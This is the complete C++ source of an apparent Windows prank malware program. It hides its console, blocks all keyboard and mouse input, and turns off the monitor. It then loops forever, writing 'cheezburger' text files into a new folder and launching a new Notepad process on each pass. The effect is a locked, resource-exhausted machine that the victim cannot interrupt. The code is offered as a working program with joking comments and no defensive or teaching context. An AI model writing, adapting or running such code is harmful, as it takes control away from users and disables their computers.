#include <fstream>
#include <direct.h>
#include <windows.h>
#include <mmsystem.h>
#include <string>
#include <iostream>

using namespace std;

int main()
{
    FreeConsole();//Hide console
    Sleep(100);
    HWND Window;
    Window = GetForegroundWindow();

    BlockInput(TRUE);// Input deactivation
    SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);// Turn off monitor

    int count = 0;
    string fileExtension = ".txt";
    string folderPath = "C:/cheezburger/";
    int result = _mkdir(folderPath.c_str());

    while (true)
    {
        string fileName = "file" + to_string(count) + fileExtension;
        string fullFilePath = folderPath + fileName;
        ofstream file(fullFilePath);

        if (file.is_open())
        {
            file << "Do you have any cheezburgers?" << endl;
            file.close();
            count++;
        }
        system("start notepad");// Starting notepad for no reason lol
    }

    return 0;
}